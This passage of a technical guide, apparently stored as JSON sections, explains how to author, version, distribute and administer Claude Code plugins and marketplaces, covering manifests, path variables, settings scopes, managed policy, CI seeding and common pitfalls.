Plugin\",\n  \"version\": \"2.1.0\",\n  \"description\": \"Internal tooling for the platform team\",\n  \"author\": { \"name\": \"Platform Team\", \"email\": \"platform@example.com\" },\n  \"homepage\": \"https://wiki.example.com/claude-plugins\",\n  \"repository\": \"https://github.com/example/my-plugin\",\n  \"license\": \"MIT\",\n  \"keywords\": [\"ci\", \"deployment\"],\n  \"defaultEnabled\": false\n}\n```\n\nRequired field: only `name`. Everything else is optional. The `name` field determines the namespace: a skill at `skills/deploy/SKILL.md` inside a plugin named `platform-tools` is invoked as `/platform-tools:deploy`.\n\nUnrecognized top-level fields are silently ignored, making it practical to maintain one manifest that doubles as an npm `package.json` or another tool's manifest. Fields with the wrong type (for example `keywords` set to a string instead of an array) are load errors.\n\n### The `commands/` vs `skills/` distinction\n\nBoth hold invocable slash-commands, but `skills/` is the modern format. A skill is a **directory** containing `SKILL.md`, which enables it to carry supporting files (scripts, reference docs). A command is a flat `.md` file. New plugins should use `skills/`. The `commands/` directory still works for backward compatibility, but will not gain new features.\n\nA plugin that ships exactly one skill can place `SKILL.md` directly at the plugin root instead of creating a `skills/` directory. Claude Code v2.1.142 and later loads it as a single skill automatically.\n\n### Common authoring mistake\n\nPutting `commands/`, `agents/`, `skills/`, or `hooks/` *inside* `.claude-plugin/` is the single most common error. Those directories need to be sibling directories to `.claude-plugin/`, not children of it. Validate early:\n\n```bash\nclaude plugin validate ./my-plugin\nclaude plugin validate ./my-plugin --strict  # treat warnings as errors (useful in CI)\n```"
   },
   {
    "heading": "Plugin Environment Variables: Referencing Bundled Files Correctly",
    "body": "When Claude Code installs a marketplace plugin, it copies the plugin directory into a local cache at `~/.claude/plugins/cache`. The path changes on every update. If you hardcode any absolute path in a hook command or MCP server config, that path breaks on the first update. Three substitution variables solve this.\n\n### `${CLAUDE_PLUGIN_ROOT}`\n\nThe absolute path to the plugin's installation directory for the current version. Use this to reference scripts, binaries, and config files bundled with the plugin.\n\n```json\n{\n  \"mcpServers\": {\n    \"my-server\": {\n      \"command\": \"${CLAUDE_PLUGIN_ROOT}/servers/db-server\",\n      \"args\": [\"--config\", \"${CLAUDE_PLUGIN_ROOT}/config.json\"]\n    }\n  },\n  \"hooks\": {\n    \"PostToolUse\": [\n      {\n        \"matcher\": \"Write|Edit\",\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"\\\"${CLAUDE_PLUGIN_ROOT}\\\"/scripts/lint.sh\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\n**Important:** In shell-form hook commands and monitor commands, wrap the variable in double quotes (`\"${CLAUDE_PLUGIN_ROOT}\"`) to handle directory paths that contain spaces. In exec-form hooks (the `args` array format), pass it as a single argument without quoting — the path is not subject to word splitting.\n\nDo not write state to `${CLAUDE_PLUGIN_ROOT}`. The directory is ephemeral — previous versions remain on disk for approximately seven days after an update before cleanup, but must be treated as read-only.\n\nWhen a plugin updates mid-session, hook commands, monitors, MCP servers, and LSP servers continue using the previous version's path until you run `/reload-plugins`. Monitors require a full session restart to pick up the new path.\n\n### `${CLAUDE_PLUGIN_DATA}`\n\nA **persistent directory** that survives plugin updates. Resolves to `~/.claude/plugins/data/{id}/` where `{id}` is the plugin identifier with any character outside `a-z`, `A-Z`, `0-9`, `_`, and `-` replaced by `-`. For a plugin installed as `formatter@my-marketplace`, the directory is `~/.claude/plugins/data/formatter-my-marketplace/`.\n\nUse this for installed dependencies (`node_modules`, Python virtual environments), caches, and any file that should outlive a version. The recommended pattern compares a manifest against the stored copy and reinstalls when they differ:\n\n```json\n{\n  \"hooks\": {\n    \"SessionStart\": [\n      {\n        \"hooks\": [\n          {\n            \"type\": \"command\",\n            \"command\": \"diff -q \\\"${CLAUDE_PLUGIN_ROOT}/package.json\\\" \\\"${CLAUDE_PLUGIN_DATA}/package.json\\\" >/dev/null 2>&1 || (cd \\\"${CLAUDE_PLUGIN_DATA}\\\" && cp \\\"${CLAUDE_PLUGIN_ROOT}/package.json\\\" . && npm install) || rm -f \\\"${CLAUDE_PLUGIN_DATA}/package.json\\\"\"\n          }\n        ]\n      }\n    ]\n  }\n}\n```\n\nThe `diff` exits nonzero when the stored copy is missing or differs, covering first run and dependency-changing updates. If `npm install` fails, the trailing `rm` removes the copied manifest so the next session retries.\n\nThe data directory is deleted automatically when the plugin is uninstalled from the last scope where it is installed. Pass `--keep-data` to the `plugin uninstall` CLI command to preserve it.\n\n### `${CLAUDE_PROJECT_DIR}`\n\nThe project root — the same directory hooks receive as the `CLAUDE_PROJECT_DIR` environment variable. Use this when a plugin needs to reference project-local configuration files that are not part of the plugin bundle itself.\n\n### Summary table\n\n| Variable | Resolves to | Persistent across updates? | Use for |\n|---|---|---|---|\n| `${CLAUDE_PLUGIN_ROOT}` | Current version cache dir | No | Bundled scripts, binaries, config |\n| `${CLAUDE_PLUGIN_DATA}` | `~/.claude/plugins/data/{id}/` | Yes | node_modules, generated caches, state |\n| `${CLAUDE_PROJECT_DIR}` | Project working directory | N/A | Project-local scripts and config |\n\nAll three are substituted inline in skill content, agent content, hook commands, monitor commands, and MCP or LSP server configs. All are also exported as shell environment variables to hook processes and MCP/LSP server subprocesses."
   },
   {
    "heading": "Building a Marketplace: The Catalog Layer",
    "body": "A plugin is a directory; a **marketplace** is a catalog that tells Claude Code where to find plugins. The catalog is defined by a `marketplace.json` file at `.claude-plugin/marketplace.json` in your marketplace repository.\n\n### Minimal `marketplace.json`\n\n```json\n{\n  \"name\": \"platform-tools\",\n  \"owner\": { \"name\": \"Platform Team\", \"email\": \"platform@example.com\" },\n  \"plugins\": [\n    {\n      \"name\": \"code-formatter\",\n      \"source\": \"./plugins/code-formatter\",\n      \"description\": \"Autoformat on write\"\n    },\n    {\n      \"name\": \"deploy-tools\",\n      \"source\": {\n        \"source\": \"github\",\n        \"repo\": \"example-org/deploy-plugin\",\n        \"ref\": \"v2.0.0\",\n        \"sha\": \"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\"\n      },\n      \"description\": \"Deployment automation\",\n      \"category\": \"devops\"\n    }\n  ]\n}\n```\n\nThe `name` field is the marketplace identifier. It must be unique per user — adding a second marketplace with the same name silently replaces the first. It is public-facing: users install plugins as `code-formatter@platform-tools`.\n\n### Plugin source types\n\n| Source type | When to use | Key fields |\n|---|---|---|\n| Relative path (`\"./plugins/x\"`) | Plugin lives in the same repo | Path string (must start with `./`) |\n| `github` object | Plugin in a GitHub repo | `repo` (required), `ref?`, `sha?` |\n| `url` object | Plugin in any git repo (GitLab, Bitbucket, etc.) | `url` (required), `ref?`, `sha?` |\n| `git-subdir` object | Plugin in a subdirectory of a monorepo (sparse clone) | `url`, `path` (required), `ref?`, `sha?` |\n| `npm` object | Plugin packaged as an npm package | `package` (required), `version?`, `registry?` |\n\n**Relative path note:** relative paths resolve against the marketplace root (the directory containing `.claude-plugin/`), not against the `.claude-plugin/` directory itself. They only work when users add your marketplace via git. If you distribute a URL that points directly to `marketplace.json`, Claude Code downloads only that file and cannot resolve relative paths — switch to external source types for URL-based distribution.\n\n### Marketplace repository layout\n\n```\nmy-marketplace/\n├── .claude-plugin/\n│   └── marketplace.json       # catalog — lives here specifically\n├── plugins/                   # co-located plugins (optional)\n│   ├── code-formatter/\n│   │   ├── .claude-plugin/\n│   │   │   └── plugin.json\n│   │   └── skills/\n│   └── deploy-tools/\n│       └── ...\n└── README.md\n```\n\n### Workflow: add and install\n\n```shell\n# Register the marketplace (interactive, inside Claude Code)\n/plugin marketplace add example-org/claude-plugins\n\n# Pin to a specific branch using @ref suffix\n/plugin marketplace add example-org/claude-plugins@v2.0\n\n# Or from the CLI (non-interactive, useful in scripts/CI)\nclaude plugin marketplace add example-org/claude-plugins\n\n# Add from a git URL on a non-GitHub host\nclaude plugin marketplace add https://gitlab.com/org/plugins.git\n\n# Install a specific plugin\nclaude plugin install code-formatter@platform-tools\n\n# Install at project scope (shares with team via VCS)\nclaude plugin install deploy-tools@platform-tools --scope project\n\n# Validate your marketplace before publishing\nclaude plugin validate .\n```\n\n**Reserved names:** The following marketplace names are reserved for official Anthropic use and cannot be registered: `claude-code-marketplace`, `claude-code-plugins`, `claude-plugins-official`, `claude-plugins-community`, `claude-community`, `anthropic-marketplace`, `anthropic-plugins`, `agent-skills`, `anthropic-agent-skills`, `knowledge-work-plugins`, `life-sciences`, `claude-for-legal`, `claude-for-financial-services`, `financial-services-plugins`. Names that impersonate official marketplaces are also blocked."
   },
   {
    "heading": "Settings Scope: Where Enabled-State Lives",
    "body": "Every Claude Code setting — including plugin `enabledPlugins` and `extraKnownMarketplaces` — is written to exactly one settings file. The file determines **who sees the setting and whether it can be overridden**.\n\n### The four scopes\n\n| Scope | File | Committed to git? | Who it affects | Override priority |\n|---|---|---|---|---|\n| `user` | `~/.claude/settings.json` | No (personal) | That user, all projects | Lowest editable |\n| `project` | `.claude/settings.json` | Yes | Everyone who clones the repo | Overrides user |\n| `local` | `.claude/settings.local.json` | No (gitignored) | That user, that project | Overrides project |\n| `managed` | System path (see below) | No (admin-deployed) | All users on the machine | Highest; read-only |\n\nWhen the same key appears at multiple scopes, higher-priority scopes win, with one exception: **permission rules merge across scopes** rather than override.\n\n### Committed vs personal settings\n\nFor plugin and marketplace configuration specifically:\n\n| Setting | Goes in committed `.claude/settings.json`? | Why |\n|---|---|---|\n| `extraKnownMarketplaces` | Yes — that is the point | Registers team marketplace for all cloners |\n| `enabledPlugins` (project-wide) | Yes | Makes specific plugins active for all team members |\n| `enabledPlugins` (personal preference) | No — use `~/.claude/settings.json` | Personal tooling should not force teammates |\n| `strictKnownMarketplaces` | No — managed settings only | Requires admin deployment; cannot live in project settings |\n| `blockedMarketplaces` | No — managed settings only | Same |\n\n### `enabledPlugins` format\n\nIn user, project, and local settings, `enabledPlugins` is a **keyed object** where each key is `plugin-name@marketplace-name` and the value is `true` (enabled) or `false` (explicitly disabled):\n\n```json\n{\n  \"enabledPlugins\": {\n    \"github@claude-plugins-official\": true,\n    \"code-formatter@platform-tools\": true\n  }\n}\n```\n\nWhen a plugin key appears in `enabledPlugins` in **any** scope, that explicit setting persists across plugin updates and reinstalls. Changing `defaultEnabled` in a later plugin release does not flip an existing user who has an explicit setting.\n\n### Specifying scope on install\n\n```bash\n# user scope (default) — writes to ~/.claude/settings.json\nclaude plugin install my-tool@marketplace\n\n# project scope — writes to .claude/settings.json (commit this)\nclaude plugin install my-tool@marketplace --scope project\n\n# local scope — writes to .claude/settings.local.json (gitignored)\nclaude plugin install my-tool@marketplace --scope local\n```\n\nRemove a marketplace declaration from a specific scope without affecting others:\n\n```bash\n# Remove only from project scope; user-scope declaration remains active\nclaude plugin marketplace remove platform-tools --scope project\n```"
   },
   {
    "heading": "Project-Scope Distribution via VCS: The Team Rollout Pattern",
    "body": "The most practical pattern for distributing plugins to a team without touching every developer machine individually is to commit the marketplace registration and plugin enablement into the repo's `.claude/settings.json`.\n\n### The committed `.claude/settings.json`\n\n```json\n{\n  \"extraKnownMarketplaces\": {\n    \"platform-tools\": {\n      \"source\": {\n        \"source\": \"github\",\n        \"repo\": \"example-org/claude-plugins\"\n      }\n    }\n  },\n  \"enabledPlugins\": {\n    \"code-formatter@platform-tools\": true,\n    \"deploy-tools@platform-tools\": true\n  }\n}\n```\n\nCommit this file. When a teammate clones the repository and opens Claude Code, they are automatically prompted to trust the project folder. On trust, Claude Code registers the marketplace and loads the declared plugins — no manual install step required.\n\n### What each key does\n\n`extraKnownMarketplaces` registers a marketplace by name so it can be referenced in `enabledPlugins`. The name (`\"platform-tools\"`) becomes the `@marketplace-name` qualifier in install commands.\n\n`enabledPlugins` at project scope makes those plugins active for everyone who works in the repo. Users cannot individually disable them from project scope; they would need to override at local scope.\n\nYou can also add an `autoUpdate` flag to a marketplace entry so Claude Code refreshes it at startup without requiring each user to toggle auto-update manually:\n\n```json\n{\n  \"extraKnownMarketplaces\": {\n    \"platform-tools\": {\n      \"source\": { \"source\": \"github\", \"repo\": \"example-org/claude-plugins\" },\n      \"autoUpdate\": true\n    }\n  }\n}\n```\n\n### The gitignored counterpart\n\nAnything that should *not* propagate to teammates goes in `.claude/settings.local.json`, which Claude Code automatically gitignores when it creates it:\n\n```json\n{\n  \"enabledPlugins\": {\n    \"personal-dashboard@platform-tools\": true\n  }\n}\n```\n\n### Two-file summary\n\n| File | Committed? | Who controls it | Typical content |\n|---|---|---|---|\n| `.claude/settings.json` | Yes | Repo owner / team lead | Team marketplaces, shared plugins, project permissions |\n| `.claude/settings.local.json` | No (gitignored) | Individual dev | Personal plugin overrides, local-only enablements |\n| `~/.claude/settings.json` | No (per-machine) | Individual dev | Personal plugins for all projects |\n\n### Private repo authentication for teams\n\nManual installs and updates use the existing git credential helper (for example `gh auth login`) without requiring environment variables. Background auto-updates run at startup without credential helpers, so a token is needed for those:\n\n| Provider | Environment variables | Notes |\n|---|---|---|\n| GitHub | `GITHUB_TOKEN` or `GH_TOKEN` | Personal access token or GitHub App token |\n| GitLab | `GITLAB_TOKEN` or `GL_TOKEN` | Personal access token or project token |\n| Bitbucket | `BITBUCKET_TOKEN` | App password or repository access token |\n\n```bash\n# Set in shell profile or CI secret\nexport GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx\n```"
   },
   {
    "heading": "Managed (Admin) Settings: Enforced Plugin Policy",
    "body": "User and project settings are writable by the person running Claude Code. Managed settings are **admin-deployed and read-only** — individual users cannot modify or remove them. This is the layer for enforcing which marketplaces are allowed, which plugins are mandatory, and which hooks can run.\n\n### File locations\n\n```\nmacOS:    /Library/Application Support/ClaudeCode/managed-settings.json\nLinux/WSL: /etc/claude-code/managed-settings.json\nWindows:  C:\\Program Files\\ClaudeCode\\managed-settings.json\n```\n\nDrop-in directory (files merged alphabetically; numeric prefixes recommended for ordering):\n\n```\nmacOS:    /Library/Application Support/ClaudeCode/managed-settings.d/\nLinux/WSL: /etc/claude-code/managed-settings.d/\nWindows:  C:\\Program Files\\ClaudeCode\\managed-settings.d/\n```\n\nDrop-in merge behavior: `managed-settings.json` is the base; all `*.json` files in `managed-settings.d/` are sorted alphabetically and merged into it. Scalar values: later files override earlier ones. Arrays: concatenated and de-duplicated. Objects: deep-merged. Hidden files (starting with `.`) are ignored.\n\nThese can also be delivered via MDM: macOS uses the `com.anthropic.claudecode` plist domain (Jamf, Kandji); Windows uses `HKLM\\SOFTWARE\\Policies\\ClaudeCode` registry key via Group Policy or Intune.\n\n### Key managed settings for plugin control\n\n```json\n{\n  \"strictKnownMarketplaces\": [\n    {\n      \"source\": \"github\",\n      \"repo\": \"example-org/approved-plugins\"\n    },\n    {\n      \"source\": \"hostPattern\",\n      \"hostPattern\": \"^github\\.example\\.com$\"\n    }\n  ],\n  \"extraKnownMarketplaces\": {\n    \"internal-tools\": {\n      \"source\": {\n        \"source\": \"github\",\n        \"repo\": \"example-org/internal-plugins\"\n      }\n    }\n  },\n  \"enabledPlugins\": {\n    \"compliance-checker@internal-tools\": true\n  },\n  \"blockedMarketplaces\": [\n    { \"source\": \"github\", \"repo\": \"untrusted/plugins\" }\n  ],\n  \"allowManagedHooksOnly\": true,\n  \"pluginSuggestionMarketplaces\": [\"internal-tools\"],\n  \"pluginTrustMessage\": \"Plugins from internal-tools have been vetted by IT Security\"\n}\n```\n\n### `strictKnownMarketplaces` behavior\n\n| Value | Effect |\n|---|---|\n| Key absent (default) | No restrictions; users can add any marketplace |\n| `[]` (empty array) | Complete lockdown; no marketplace additions allowed |\n| Array of source objects | Only listed sources can be registered; others are blocked |\n\nSupported source types in `strictKnownMarketplaces`: `github` (with `repo`, optional `ref`), `url` (exact URL match), `hostPattern` (regex on host), `pathPattern` (regex on filesystem path), and `skills-dir` (blocks the skills-directory source).\n\nRestrictions are checked retroactively: if a user added a marketplace before the policy was set and its source no longer matches the allowlist, Claude Code refuses to install or update plugins from it.\n\nPair `strictKnownMarketplaces` with `extraKnownMarketplaces` to simultaneously restrict and auto-register your approved marketplace. The restriction controls what users can add; `extraKnownMarketplaces` registers marketplaces without user action.\n\n### `allowManagedHooksOnly`\n\nWhen set to `true`, only hooks from managed settings, SDK hooks, and plugins explicitly force-enabled in managed `enabledPlugins` will run. User-defined hooks and hooks from user- or project-scope plugins are blocked. This is the lock-down posture for security-sensitive environments.\n\n### Plugins force-enabled in managed settings bypass `allowManagedHooksOnly`\n\nA plugin listed in managed `enabledPlugins` is considered trusted by the admin and its hooks run even when `allowManagedHooksOnly` is true. This is the mechanism for deploying security tooling that must always be active."
   },
   {
    "heading": "Version Pinning and Resolution: Getting Reproducibility Right",
    "body": "The version resolution order is:\n\n1. `version` in the plugin's `plugin.json`\n2. `version` in the plugin's marketplace entry in `marketplace.json`\n3. Git commit SHA of the plugin's source (for `github`, `url`, `git-subdir`, and relative-path sources in a git-hosted marketplace)\n4. `\"unknown\"` for `npm` sources or local directories not inside a git repository\n\n`plugin.json` wins over the marketplace entry, silently. This is the most common source of version confusion: you bump `version` in `marketplace.json` and nothing changes for users because `plugin.json` still declares the old string.\n\n### The two strategies\n\n**SHA-based (no explicit version):** omit `version` from both `plugin.json` and the marketplace entry. Every commit is treated as a new version. Auto-update fires on every push. This is the simplest setup for actively developed internal plugins and avoids the stale-manifest problem entirely.\n\n```json\n{\n  \"name\": \"deploy-tools\",\n  \"source\": {\n    \"source\": \"github\",\n    \"repo\": \"example-org/deploy-plugin\"\n  }\n}\n```\n\n**SemVer-pinned:** set `version` only in `marketplace.json` (not `plugin.json`), or in both consistently. Users only receive an update when you bump the string. Good for stable tooling where you want explicit release gating.\n\n```json\n{\n  \"name\": \"code-formatter\",\n  \"source\": {\n    \"source\": \"github\",\n    \"repo\": \"example-org/formatter\",\n    \"ref\": \"v2.1.0\",\n    \"sha\": \"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\"\n  },\n  \"version\": \"2.1.0\"\n}\n```\n\nWhen both `ref` and `sha` are set, `sha` is the effective pin. On most git hosts (GitHub, GitLab, Bitbucket), installation succeeds even if the branch or tag named by `ref` has since been deleted, as long as the commit is still reachable. AWS CodeCommit does not support fetching commits by SHA directly; the `ref` must still exist and the pinned commit must be reachable from it.\n\n### Release channels\n\nTo support stable/latest channels, create two separate marketplace repositories (or two `marketplace.json` entries) pointing to different refs of the same plugin repo:\n\n```json\n// stable-marketplace/.claude-plugin/marketplace.json\n{\n  \"name\": \"stable-tools\",\n  \"plugins\": [{\n    \"name\": \"formatter\",\n    \"source\": { \"source\": \"github\", \"repo\": \"org/formatter\", \"ref\": \"stable\" }\n  }]\n}\n```\n\n```json\n// latest-marketplace/.claude-plugin/marketplace.json\n{\n  \"name\": \"latest-tools\",\n  \"plugins\": [{\n    \"name\": \"formatter\",\n    \"source\": { \"source\": \"github\", \"repo\": \"org/formatter\", \"ref\": \"latest\" }\n  }]\n}\n```\n\nAssign each channel to a different user group via `extraKnownMarketplaces` in managed settings. Each channel must resolve to a different version — if two refs resolve to the same version string, Claude Code treats them as identical and skips the update.\n\n### Common version pitfall\n\nSetting `version` in `plugin.json` and shipping new commits without changing that string does nothing for existing users. The cache key matches and Claude Code keeps the cached copy. Either bump the string on every release, or omit it to use SHA-based versioning. Avoid setting `version` in both `plugin.json` and the marketplace entry — `plugin.json` always wins silently."
   },
   {
    "heading": "Always-On Token Cost Budgeting",
    "body": "Every enabled plugin contributes to the token count of every session, because its skills load into context, its MCP servers start automatically, and its hooks fire on every matching event. This is not a bug — it is the expected behavior. The question is whether you have accounted for it.\n\nYou can inspect a plugin's projected cost before installing:\n\n```bash\nclaude plugin details ai-code-reviewer@platform-tools\n```\n\nThe output shows an **always-on** token estimate (the tokens added to every session by the plugin's listing text) and a **per-component on-invoke** estimate (paid when a skill or agent actually fires).\n\n### What each plugin component costs\n\n| Component | When it consumes tokens | Magnitude |\n|---|---|---|\n| Skills / commands | Loaded into context at session start | Each `SKILL.md` is injected; more skills = larger system prompt |\n| MCP servers | Start at session launch; every tool call adds tool-result tokens | Depends on server output verbosity |\n| Hooks | Fire on matching events; if hook type is `prompt` or `agent`, they invoke the model | `prompt`/`agent` hooks are the expensive ones |\n| Monitors | Each stdout line is delivered as a notification to Claude | High if the watched process is chatty |\n| Agents | Paid only when invoked | Usually negligible at rest |\n\n### The `defaultEnabled: false` pattern\n\nPlugins that add significant standing cost should ship with `defaultEnabled: false` in `plugin.json`:\n\n```json\n{\n  \"name\": \"ai-code-reviewer\",\n  \"description\": \"Deep AI-powered code review (invokes model on every commit)\",\n  \"defaultEnabled\": false\n}\n```\n\nThis requires Claude Code v2.1.154 or later. Earlier versions ignore the field and enable the plugin on install. The user opts in explicitly:\n\n```bash\nclaude plugin enable ai-code-reviewer@platform-tools\n```\n\nThe `defaultEnabled` field in the marketplace entry takes precedence over the value in `plugin.json`:\n\n```json\n// In marketplace.json — overrides the plugin's own default\n{\n  \"name\": \"ai-code-reviewer\",\n  \"source\": { \"source\": \"github\", \"repo\": \"org/ai-reviewer\" },\n  \"defaultEnabled\": false\n}\n```\n\nTwo things take precedence over `defaultEnabled`: (1) an existing explicit `enabledPlugins` entry for the plugin from any scope, and (2) a dependency requirement from another active plugin (which writes an explicit `true` at install time).\n\n### Practical cost guidance for plugin authors\n\n- Keep `SKILL.md` files concise. A skill loaded into context is always-on overhead.\n- Avoid `prompt` or `agent` type hooks for frequent events (`PostToolUse` with broad matchers). Reserve model-invoking hooks for high-signal, low-frequency events.\n- If your MCP server is only needed for specific tasks, consider whether it should be its own opt-in plugin rather than bundled into a larger always-on plugin.\n- Use the `when` field to defer monitor startup until actually needed:\n\n```json\n[\n  {\n    \"name\": \"error-log\",\n    \"command\": \"tail -F ./logs/error.log\",\n    \"description\": \"Application error log\",\n    \"when\": \"on-skill-invoke:debug\"\n  }\n]\n```\n\nThe `when: \"on-skill-invoke:debug\"` value starts the monitor only the first time `/my-plugin:debug` is invoked, not at session start. The default (`\"always\"`) starts it at session start."
   },
   {
    "heading": "Seeding Plugins in CI and Containers",
    "body": "In CI environments, git operations at startup add latency and depend on network access. Claude Code provides a mechanism to pre-populate the entire plugin cache at image build time so that at runtime no cloning is needed.\n\n### Build-time population\n\nUse `CLAUDE_CODE_PLUGIN_CACHE_DIR` to redirect where plugins install during the build, then set `CLAUDE_CODE_PLUGIN_SEED_DIR` at runtime to point Claude Code at that pre-populated directory:\n\n```bash\n# During Docker image build: install directly into the seed directory\nexport CLAUDE_CODE_PLUGIN_CACHE_DIR=/opt/claude-seed\n\nclaude plugin marketplace add example-org/platform-tools\nclaude plugin install code-formatter@platform-tools\nclaude plugin install deploy-tools@platform-tools\n```\n\nThen in your `Dockerfile`:\n\n```dockerfile\n# Builder stage installs plugins into /opt/claude-seed\nFROM node:20 AS builder\nENV CLAUDE_CODE_PLUGIN_CACHE_DIR=/opt/claude-seed\nRUN npm install -g @anthropic-ai/claude-code\nRUN claude plugin marketplace add example-org/platform-tools\nRUN claude plugin install code-formatter@platform-tools\n\n# Runtime stage uses the seed\nFROM node:20\nCOPY --from=builder /opt/claude-seed /opt/claude-seed\nENV CLAUDE_CODE_PLUGIN_SEED_DIR=/opt/claude-seed\n```\n\nThe seed directory mirrors `~/.claude/plugins` with `known_marketplaces.json`, `marketplaces/<name>/`, and `cache/<marketplace>/<plugin>/<version>/` subdirectories.\n\n### Runtime behavior with a seed directory\n\n- **Read-only:** Claude Code never writes to the seed directory. Auto-updates are disabled for seed-managed marketplaces (git pull would fail on a read-only filesystem).\n- **Seed entries take precedence:** marketplaces declared in the seed overwrite matching entries in user configuration on each startup.\n- **Composes with settings:** if `extraKnownMarketplaces` or `enabledPlugins` in `.claude/settings.json` declares a marketplace already in the seed, the seed copy is used instead of cloning.\n- **Mutation is blocked:** `/plugin marketplace update` and `/plugin marketplace remove` fail against seed-managed marketplaces with guidance to update the seed image instead.\n- **Path-independent:** Claude Code probes `$CLAUDE_CODE_PLUGIN_SEED_DIR/marketplaces/<name>/` at runtime, so the seed works correctly even when mounted at a different path than where it was built.\n\n### Offline / airgapped environments\n\nIf network access fails at startup and you want to preserve the last-known-good state instead of wiping the cache:\n\n```bash\nexport CLAUDE_CODE_PLUGIN_KEEP_MARKETPLACE_ON_FAILURE=1\n```\n\nWithout this variable, a failed `git pull` causes Claude Code to remove the stale clone and attempt a re-clone, which also fails, leaving the marketplace directory empty. With it, the stale clone is retained and plugins continue working.\n\n### Layering multiple seed directories\n\nSeparate with `:` on Unix, `;` on Windows:\n\n```bash\nexport CLAUDE_CODE_PLUGIN_SEED_DIR=/opt/base-plugins:/opt/team-plugins\n```\n\nClaude Code searches each directory in order; the first seed that contains a given marketplace or plugin wins."
   },
   {
    "heading": "Development Workflow: From Scaffold to Published Marketplace",
    "body": "### Scaffold a plugin for local iteration\n\n```bash\n# Creates ~/.claude/skills/my-tool/ with manifest and starter SKILL.md\nclaude plugin init my-tool\n\n# Scaffold with additional component folders\n# Valid --with values: skills, agents, hooks, mcp, lsp, output-style, channel\nclaude plugin init my-tool --with skills agents hooks mcp\n```\n\nPlugins in `~/.claude/skills/` auto-load on the next session as `my-tool@skills-dir` — no marketplace, no install step. Edits to `SKILL.md` take effect immediately in the current session; changes to hooks, MCP servers, and agents require `/reload-plugins`.\n\nProject-scope skills-directory plugins (`<repo>/.claude/skills/<plugin>/`) load only after the workspace trust gate and carry some restrictions: background monitors do not load, and MCP servers go through the same per-server approval as a project `.mcp.json`.\n\n### Test a plugin directory without installing\n\n```bash\n# Load for this session only\nclaude --plugin-dir ./my-plugin\n\n# Load multiple plugins\nclaude --plugin-dir ./plugin-a --plugin-dir ./plugin-b\n\n# Test from a zip archive (requires v2.1.128 or later)\nclaude --plugin-dir ./my-plugin.zip\n\n# Test from a URL (CI build artifact)\nclaude --plugin-url https://example.com/my-plugin.zip\n\n# Load multiple URLs (space-separated as one argument, or repeated flags)\nclaude --plugin-url \"https://example.com/a.zip https://example.com/b.zip\"\n```\n\nWhen `--plugin-dir` names a plugin with the same name as an installed marketplace plugin, the local copy takes precedence for that session. Exception: managed settings that force-enable or force-disable a plugin override `--plugin-dir`.\n\n### Validate before pushing\n\n```bash\n# Validate marketplace.json (when pointed at a marketplace directory)\nclaude plugin validate .\n\n# Validate a specific plugin directory (checks plugin.json, skill/agent frontmatter, hooks.json)\nclaude plugin validate ./my-marketplace/plugins/my-plugin\n\n# Strict mode: treat warnings as errors (recommended in CI)\nclaude plugin validate ./my-plugin --strict\n```\n\nCommon validation errors:\n\n| Error | Cause | Fix |\n|---|---|---|\n| `File not found: .claude-plugin/marketplace.json` | Missing catalog | Create the file |\n| `Duplicate plugin name \"x\" found in marketplace` | Two entries share a name | Give each a unique `name` |\n| `plugins[0].source: Path contains \"..\"` | Relative path escapes marketplace root | Use paths within the marketplace root only |\n| `YAML frontmatter failed to parse` | Invalid YAML in a SKILL.md | Fix the frontmatter block |\n\n### Lifecycle commands\n\n```bash\n# Inside a session — reload without restart\n/reload-plugins\n\n# CLI equivalents for scripting\nclaude plugin list\nclaude plugin enable my-tool@marketplace\nclaude plugin disable my-tool@marketplace\nclaude plugin uninstall my-tool@marketplace\nclaude plugin uninstall my-tool@marketplace --keep-data  # preserve data dir\nclaude plugin update my-tool@marketplace  # update one plugin\nclaude plugin marketplace list\nclaude plugin marketplace update          # refresh all marketplace catalogs\nclaude plugin marketplace update my-marketplace  # refresh one\nclaude plugin details my-tool@marketplace  # show components + token cost estimate\n```"
   },
   {
    "heading": "Common Pitfalls and Failure Modes",
    "body": "### Pitfall 1: Components inside `.claude-plugin/`\n\nThe most common authoring mistake. Files placed inside `.claude-plugin/` other than `plugin.json` are ignored. Claude Code does not error loudly — the skill or hook simply does not appear. Run `claude plugin validate` first.\n\n### Pitfall 2: `version` in `plugin.json` blocks updates\n\nIf `plugin.json` declares `\"version\": \"1.0.0\"` and you push new commits without changing that string, existing users receive no update. The cache key matches. If your plugin is actively developed and you do not want to manually bump a version on every commit, omit `version` entirely and use the SHA-based mechanism.\n\n### Pitfall 3: Marketplace name collision replaces existing entry\n\nAdding a second marketplace with the same `name` silently replaces the first. This bites teams that name their marketplace after the company (`\"acme\"`) and then try to add a second one. Use distinct, specific names (`\"acme-platform-tools\"`, `\"acme-security-tools\"`) or group all plugins into one `marketplace.json`.\n\n### Pitfall 4: `CLAUDE_PLUGIN_ROOT` without quotes in shell-form hooks\n\nPaths with spaces silently break commands. Always wrap in double quotes in shell-form contexts:\n\n```json\n{ \"command\": \"\\\"${CLAUDE_PLUGIN_ROOT}\\\"/scripts/lint.sh\" }\n```\n\n### Pitfall 5: Relative path sources in URL-based marketplaces\n\nIf users add your marketplace via a URL pointing to `marketplace.json` (not a git repo), relative `source` paths like `\"./plugins/formatter\"` fail because only the JSON file was downloaded, not the plugin directories. Use GitHub/git/npm sources for any marketplace distributed this way.\n\n### Pitfall 6: Removing a marketplace uninstalls its plugins\n\n`/plugin marketplace remove` or `claude plugin marketplace remove` uninstalls all plugins from that marketplace when it is removed from the last scope where it is declared. To refresh without losing plugins, use `update` instead of `remove + re-add`.\n\n### Pitfall 7: Project-scope `@skills-dir` plugins do not walk up from subdirectories\n\nPlugins in `.claude/skills/` (project-scope `@skills-dir`) load only when Claude Code is launched from the directory that contains `.claude/skills/`. Starting from a subdirectory misses the plugin entirely. Always launch from the repository root, or run `/reload-plugins` after navigating.\n\n### Pitfall 8: Path traversal between plugins\n\nWhen a plugin is installed from a marketplace, its directory is copied into `~/.claude/plugins/cache`. Paths like `../shared-utils` do not work because those files are not copied. To share files across plugins in the same marketplace, use symlinks: within-plugin symlinks are preserved as relative symlinks in the cache; within-marketplace symlinks are dereferenced and the target content is copied; symlinks pointing outside the marketplace root are skipped for security.\n\n### Pitfall 9: `version` set in both `plugin.json` and marketplace entry\n\n`plugin.json` always wins silently. 